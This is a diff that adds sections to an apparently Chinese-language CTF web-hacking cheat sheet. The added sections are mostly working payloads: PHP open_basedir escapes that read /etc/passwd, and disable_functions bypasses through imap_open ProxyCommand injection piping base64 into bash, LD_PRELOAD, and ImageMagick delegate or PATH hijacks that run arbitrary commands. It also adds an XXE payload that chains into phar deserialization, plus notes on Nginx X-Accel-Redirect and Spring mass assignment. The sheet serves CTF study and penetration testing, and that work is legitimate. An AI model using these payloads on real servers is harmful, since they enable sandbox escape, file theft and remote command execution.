@@ -541,6 +541,115 @@ Request: `http://kaibro.tw/test.php?url=%67%67`
 - Example
     - Code-Breaking Puzzles - pcrewaf
 
+## open_basedir繞過
+
+- glob 列目錄
+
+```php
+$file_list = array();
+$it = new DirectoryIterator("glob:///*");
+foreach($it as $f) {  
+    $file_list[] = $f->__toString();
+}
+sort($file_list);  
+foreach($file_list as $f){  
+    echo "{$f}<br/>";
+}
+```
+
+- [phuck3](https://twitter.com/Blaklis_/status/1111586655134203904)
+
+```php
+chdir('img');
+ini_set('open_basedir','..');
+chdir('..');chdir('..');
+chdir('..');chdir('..');
+ini_set('open_basedir','/');
+echo(file_get_contents('flag'));
+```
+
+- symlinks
+
+```php
+mkdir('/var/www/html/a/b/c/d/e/f/g/',0777,TRUE);
+symlink('/var/www/html/a/b/c/d/e/f/g','foo');
+ini_set('open_basedir','/var/www/html:bar/');
+symlink('foo/../../../../../../','bar');
+unlink('foo');
+symlink('/var/www/html/','foo');
+echo file_get_contents('bar/etc/passwd');
+```
+
+- Fastcgi
+    - [link](https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy)
+
+- ...
+
+## disable_functions繞過
+
+- bash shellshock
+- mail()
+    - `sendmail`
+    - putenv寫LD_PRELOAD
+    - trick: [LD_PRELOAD without sendmail/getuid()](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
+- imap_open()
+    ```php
+    <?php
+    $payload = "echo hello|tee /tmp/executed";
+    $encoded_payload = base64_encode($payload);
+    $server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
+    @imap_open('{'.$server.'}:143/imap}INBOX', '', '');
+    ```
+- error_log()
+    - 第二個參數`message_type`為1時，會去調用sendmail
+
+- ImageMagick
+    - [Command Injection](https://www.exploit-db.com/exploits/39766)
+    - LD_PRELOAD + ghostscript:
+        - Imagemagick會用ghostscript去parse `eps`
+        - [Link](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload)
+    - LD_PRELOAD + ffpmeg
+        - [Link](https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/)
+    - MAGICK_CODER_MODULE_PATH
+        - > it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory
+        - [Document](https://www.imagemagick.org/script/resources.php#Environment%20Variables)
+        - [Link](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy)
+    - MAGICK_CONFIGURE_PATH
+        - `delegates.xml`定義處理各種文件的規則
+        - 可以用putenv寫掉設定檔路徑
+        - [Link](https://xz.aliyun.com/t/4688#toc-14)
+
+        ```xml
+        <delegatemap>
+        <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/output&quot;"/>
+        </delegatemap>
+        ```
+
+    - 蓋`PATH` + ghostscript:
+        - 造一個執行檔gs
+
+        ```cpp
+        #include <stdlib.h>
+        #include <string.h>
+        int main() {
+            unsetenv("PATH");
+            const char* cmd = getenv("CMD");
+            system(cmd);
+            return 0;
+        }
+        ```
+
+        ```php
+        putenv('PATH=/tmp/mydir');
+        putenv('CMD=/readflag > /tmp/mydir/output');
+        chmod('/tmp/mydir/gs','0777');
+        $img = new Imagick('/tmp/mydir/1.ept');
+        ```
+- dl()
+    - 載入module
+    - `dl("rce.so")`
+- [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
+- 族繁不及備載......        
 
 ## 其他
 
@@ -834,6 +943,7 @@ pop graphic-context
     - @@hostname
     - @@version_compile_os
         - Operating System
+    - @@version_compile_machine
     - @@innodb_version
     - MD5()
     - SHA1()
@@ -1349,6 +1459,7 @@ HQL injection example (pwn2win 2017)
 - `/var/log/mail.log`
 - `/usr/local/apache2/conf/httpd.conf`
 - `/etc/apache2/apache2.conf`
+- `/etc/apache2/httpd.conf`
 - `/etc/apache2/sites-available/000-default.conf`
 - `/usr/local/etc/apache2/httpd.conf`
 - `/etc/nginx/conf.d/default.conf`
@@ -2091,6 +2202,19 @@ xxe.dtd:
 <data>&a4;</data>
 ```
 
+## 串Phar反序列化
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE ernw [ 
+    <!ENTITY xxe SYSTEM "phar:///var/www/html/images/gginin/xxxx.jpeg" > ]>
+    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
+</svg>
+```
+
+- Example: MidnightSun CTF - Rubenscube
+
 ## 其它
 
 - DOCX
@@ -2484,6 +2608,14 @@ state[i] = state[i-3] + state[i-31]`
     - 若將4 bytes的utf8mb4插入utf8中，在non strict模式下會被截斷
     - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
 
+- Nginx internal繞過
+    - `X-Accel-Redirect`
+    - [Document](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)
+    - Example: 
+        - Olympic CTF 2014 - CURLing
+        - MidnightSun CTF 2019 - bigspin
+
+
 - Nginx目錄穿越漏洞
     - 常見於Nginx做Reverse Proxy的狀況
     ```
@@ -2512,6 +2644,25 @@ state[i] = state[i-3] + state[i-31]`
     #define gg_height 1337
     AddType application/x-httpd-php .asp
     ```
+
+- AutoBinding / Mass Assignment
+    - [Mass_Assignment_Cheat_Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md)
+    - Spring MVC
+        - `@ModelAttribute`
+        - 會將Client端傳來的參數(GET/POST)綁定到指定Object中，並自動將此Object加到ModelMap中
+        - Example
+        ```java
+        @RequestMapping(value = "/home", method = RequestMethod.GET)
+            public String home(@ModelAttribute User user, Model model) {
+                if (showSecret){
+                    model.addAttribute("firstSecret", firstSecret);
+                }
+                return "home";
+            }
+        ```
+        - Example 2:
+            - [justiceleague](https://github.com/GrrrDog/ZeroNights-HackQuest-2016)
+        - Example 3: VolgaCTF 2019 - shop
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
